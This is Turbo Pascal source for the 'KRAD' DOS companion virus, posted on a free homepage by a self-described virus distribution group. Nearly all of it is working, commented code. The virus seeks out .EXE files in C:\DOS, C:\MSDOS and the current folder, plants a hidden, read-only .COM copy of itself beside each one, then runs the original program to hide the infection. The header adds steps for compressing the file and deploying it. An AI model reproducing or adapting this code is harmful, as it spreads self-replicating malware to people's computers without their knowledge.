Program KRAD; 
  
{      ____  _____        _______   ______ 
      /___/\/____/\      /______/\ /_____/\___  __/\_____ 
      \   \|     \  \___|       \ |      \___/ /_    ___/ BOOM! <====== 
       \           \/___|   +    \|   +  |/     /_/\/ 
        \______|\___________|\___________/ 
  
  
       Virus Laboratories and Distribution 
          Proudly present the KRAD Virus 
     Written by Metabolis for non assembler ppls 
  
  
          Why call it the KRAD virus?  Cos it is!  A companion virus 
          written in Turbo Pascal, well that just sums it up.  I wrote 
          this for two reasons.. 1) Not everyone knows assembler 2) 
          a friend reckoned a virus couldn't be programmed in Turbo 
          Pascal.. (by that he meant *I* couldn't do it).  No matter 
          how lame.. it's still a virus!  (Right up there with Aids/ 
          Number 1 :))  Fully commented for non understanding Pascal 
          people, (a very small part of the world). 
  
          Compress this with DIET/PkLite/LZEXE or something similar 
          when it's compiled.  Then rename it to a .COM file and hey 
          presto, you can run it!  I guess an added bonus of this 
          virus is, if there's another companion virus on your system 
          it won't overwrite it, it will take that as an infection 
          and leave it alone. 
  
          KRAD virus will immediately infect C:\DOS or C:\MSDOS if 
          they exist, so if any DOS .EXE files are run it will infect 
          all the files in the current dir that you ran the DOS 
          command from. } 
  
Uses Dos,Crt;  {Even if I don't use one of 'em.. 
               it's best to include both. } 
  
{$M 59999,0,8000}  {This program needs memory for two things.. 
                    1) To use as a buffer when copying the virus 
                    2) To execute the program originally run. } 
  
Var Inf,Inf2:Searchrec;  {Used in the EXE and file_exist routines } 
    Infected:Boolean;    {Is a file infected? } 
    Params:Byte;         {Loop Index for adding all parameters together } 
    All_Params:String;   {This string contains the whole list of parameters 
                          originally passed to the program } 
    P:PathStr;           { Used by the FSplit procedure. } 
    D:DirStr;            { "" } 
    N:NameStr;           { "" } 
    E:ExtStr;            { "" } 
  
Procedure Check_Infected(Path:String); 
{Is the .EXE file we've found infected? } 
Begin 
  FSplit(Inf.Name,D,N,E);             {Split it up into directory, name 
                                       and extension. } 
  FindFirst(Path+N+'.COM',Anyfile,Inf2);   {Look for the .COM file with the 
                                       same file name, if this exists 
                                       then the file is already infected. } 
  Infected:=(DosError=0);             {Set the Infected flag } 
End; 
  
Procedure CopyFile(SourceFile, TargetFile:string); 
{Straight Forward copying routine, I won't comment all of this.. } 
var 
  Source, 
  Target : file; 
  BRead, 
  Bwrite : word; 
  FileBuf  : array[1..2048] of char; 
Begin 
    Assign(Source,SourceFile); 
    SetFattr(Source,$20);              {Set the file attributes of the 
                                        hidden COM companion we're going 
                                        to be copying to archive so that 
                                        it's possible read it. } 
    {$I-} 
    Reset(Source,1); 
    {$I+} 
    If IOResult < 0 then 
    Begin 
        Exit;                          {Couldn't open the source file! } 
    End; 
    Assign(Target,TargetFile); 
    {$I-} 
    Rewrite(Target,1); 
    {$I+} 
    If IOResult < 0 then 
    Begin 
        Exit;                          {Couldn't open the target file! } 
    End; 
    Repeat 
         BlockRead(Source,FileBuf,SizeOf(FileBuf),BRead); 
         BlockWrite(Target,FileBuf,Bread,Bwrite); 
    Until (Bread = 0) or (Bread < BWrite); 
    Close(Source); 
    Close(Target); 
    SetFattr(Source,3);                {Set the COM companion that we 
                                        copied back to hidden and 
                                        read-only. } 
    SetFattr(Target,3); 
End; 
  
Procedure FaI(Path:String); 
{Find and Infect!} 
Begin 
  FindFirst(Path+'*.EXE',AnyFile,Inf);  {Check for .EXEs to infect! } 
  While DosError=0 Do Begin 
    Infected:=False; 
    Check_Infected(Path);  { Check if the .EXE found is already infected. } 
    If Not Infected then Begin 
      CopyFile(ParamStr(0),Path+N+'.COM'); 
    End; 
    { If the file isn't infected then copy the .COM version of the 
      file you're executing to companionship with the .EXE you have 
      found that isn't infected. } 
    FindNext(Inf); 
  End; 
End; 
  
Begin 
  FaI('C:\DOS\');            { Find & Infect!  Go for the DOS dirs first } 
  FaI('C:\MSDOS\');          { because this is where most EXE files will } 
  FaI('');                   { be executed from! } 
  FSplit(ParamStr(0),D,N,E); { Make sure we have the path and name of the 
                               file we actually want to execute. } 
  All_Params:='';   { "Remember to initialise those variables!" - Teacher } 
  For Params:=1 To ParamCount 
       do All_Params:=All_Params+ParamStr(Params)+' '; 
  Exec(D+N+'.EXE',All_Params);        {Execute the file that the user 
                                       wanted to in the first place 
                                       keeping all original parameters. } 
End. 
{Easy wasn't it?  I thought so.. } 

This page hosted by Get your own Free Homepage
